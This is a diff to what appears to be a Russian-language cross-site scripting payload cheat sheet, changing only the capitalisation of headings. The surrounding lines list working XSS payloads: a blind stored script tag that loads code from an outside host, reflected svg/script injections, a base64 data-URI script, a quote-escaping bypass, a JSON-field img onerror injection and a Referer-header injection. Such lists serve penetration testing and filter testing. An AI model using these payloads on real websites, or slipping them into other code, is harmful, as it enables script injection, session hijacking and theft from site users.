@@ -218,19 +218,19 @@ Greedy XSS Regex filter
    }
   }
   
-Blind stored xss
+Blind stored XSS
   "><script src=https://x.com></script>
   
-Reflective Xss
+Reflective XSS
   </script><svg><script>/<@/>alert(1337)</script>  
   
-Xss, через base64
+XSS, через base64
   <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">hack</a>
   
 XSS - Generic(пользователь может передать в качестве префикса вектора атаки пару \', пройдя через механизм экранирования, пара примет вид \\', следовательно, одинарная кавычка потеряет статус экранирования)
   #/')+alert(document.domain)//
 
-Xss(через загрузку json)
+XSS(через загрузку json)
  ”data”: {
  ”name”: ”#”><img src=/ onerror=alert(1)>”,
  ”type”: ”AUTO_EVENT_VAR”,
@@ -240,7 +240,7 @@ Xss(через загрузку json)
  }
 }
 
-Xss reflected через заголовок http Referer
+XSS reflected через заголовок http Referer
   Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5
 
 Перехват нажатий и подмена интерфейса
